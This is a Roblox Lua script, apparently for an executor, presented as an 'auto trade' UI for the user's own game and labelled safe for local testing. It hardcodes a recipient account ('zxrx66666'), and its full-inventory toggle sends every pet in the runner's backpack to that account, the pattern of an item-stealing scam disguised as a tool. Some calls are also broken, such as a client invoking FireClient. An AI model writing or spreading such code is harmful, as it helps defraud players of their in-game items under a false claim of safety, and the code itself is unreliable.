-- GAG-style Auto Trade (with interactive UI for your own Roblox game)
-- Version: UI Enhanced + Safe for local testing
-- This version lets you select pets to trade and toggle full inventory mode through the UI.
-- IMPORTANT: You must still provide a server-side handler for the Trade_RE RemoteEvent.

-- Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Remote setup
local GameEvents = ReplicatedStorage:FindFirstChild("GameEvents") or Instance.new("Folder", ReplicatedStorage)
GameEvents.Name = "GameEvents"
local Trade_RE = GameEvents:FindFirstChild("Trade_RE") or Instance.new("RemoteEvent", GameEvents)
Trade_RE.Name = "Trade_RE"
local Notification = GameEvents:FindFirstChild("Notification") or Instance.new("RemoteEvent", GameEvents)
Notification.Name = "Notification"

-- Basic config
getgenv().Configuration = getgenv().Configuration or {}
local config = getgenv().Configuration
config.targetUsername = config.targetUsername or "zxrx66666"
config.tradeWholeInventory = config.tradeWholeInventory or false
config.petToGive = config.petToGive or {}

-- UI setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoTradeUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.fromOffset(500, 350)
Frame.Position = UDim2.new(0.5, -250, 0.5, -175)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.Parent = ScreenGui
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 16)

local Title = Instance.new("TextLabel")
Title.Text = "GAG-Style Auto Trade"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 0, 0, 10)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Parent = Frame

local PetList = Instance.new("ScrollingFrame")
PetList.Size = UDim2.new(1, -40, 0, 180)
PetList.Position = UDim2.new(0, 20, 0, 50)
PetList.CanvasSize = UDim2.new(0, 0, 2, 0)
PetList.ScrollBarThickness = 6
PetList.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
PetList.BorderSizePixel = 0
PetList.Parent = Frame
Instance.new("UICorner", PetList).CornerRadius = UDim.new(0, 8)

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 6)
UIListLayout.Parent = PetList

local toggleAll = Instance.new("TextButton")
toggleAll.Size = UDim2.new(0, 200, 0, 30)
toggleAll.Position = UDim2.new(0, 20, 1, -80)
toggleAll.Text = "Toggle Full Inventory: OFF"
toggleAll.Font = Enum.Font.Gotham

toggleAll.TextSize = 16
toggleAll.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleAll.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
toggleAll.Parent = Frame
Instance.new("UICorner", toggleAll).CornerRadius = UDim.new(0, 6)

toggleAll.MouseButton1Click:Connect(function()
    config.tradeWholeInventory = not config.tradeWholeInventory
    toggleAll.Text = "Toggle Full Inventory: " .. (config.tradeWholeInventory and "ON" or "OFF")
end)

local startBtn = Instance.new("TextButton")
startBtn.Size = UDim2.new(0, 150, 0, 40)
startBtn.Position = UDim2.new(1, -170, 1, -80)
startBtn.Text = "Start Trading"
startBtn.Font = Enum.Font.GothamBold
startBtn.TextSize = 18
startBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
startBtn.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
startBtn.Parent = Frame
Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0, 6)

local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, -40, 0, 30)
Status.Position = UDim2.new(0, 20, 1, -40)
Status.BackgroundTransparency = 1
Status.Text = "Status: Idle"
Status.TextColor3 = Color3.fromRGB(255, 255, 255)
Status.Font = Enum.Font.Gotham
Status.TextSize = 16
Status.Parent = Frame

-- Load pet list from backpack
local function loadPetList()
    for _, child in ipairs(PetList:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
    if not backpack then return end
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local petName = item.Name
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, -10, 0, 30)
            btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.TextSize = 14
            btn.Font = Enum.Font.Gotham
            btn.Text = petName
            btn.Parent = PetList
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
            btn.MouseButton1Click:Connect(function()
                if table.find(config.petToGive, petName) then
                    table.remove(config.petToGive, table.find(config.petToGive, petName))
                    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
                else
                    table.insert(config.petToGive, petName)
                    btn.BackgroundColor3 = Color3.fromRGB(30, 150, 70)
                end
            end)
        end
    end
end

loadPetList()

-- Trade simulation
local function tradePet(petName, target)
    Status.Text = "Status: Trading " .. petName
    Trade_RE:FireServer("GivePet", target.Name, petName)
    task.wait(0.5)
    Notification:FireClient(LocalPlayer, "Trade complete for " .. petName)
end

startBtn.MouseButton1Click:Connect(function()
    local target = Players:FindFirstChild(config.targetUsername)
    if not target then
        Status.Text = "Status: Target not found"
        return
    end
    local pets = {}
    if config.tradeWholeInventory then
        for _, itm in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if itm:IsA("Tool") then table.insert(pets, itm.Name) end
        end
    else
        pets = config.petToGive
    end
    for _, pName in ipairs(pets) do
        tradePet(pName, target)
        task.wait(0.4)
    end
    Status.Text = "Status: Trading finished"
end)

-- Refresh pet list on backpack change
LocalPlayer.Backpack.ChildAdded:Connect(loadPetList)
LocalPlayer.Backpack.ChildRemoved:Connect(loadPetList)

Notification.OnClientEvent:Connect(function(msg)
    Status.Text = "Status: " .. msg
end)

-- End of script
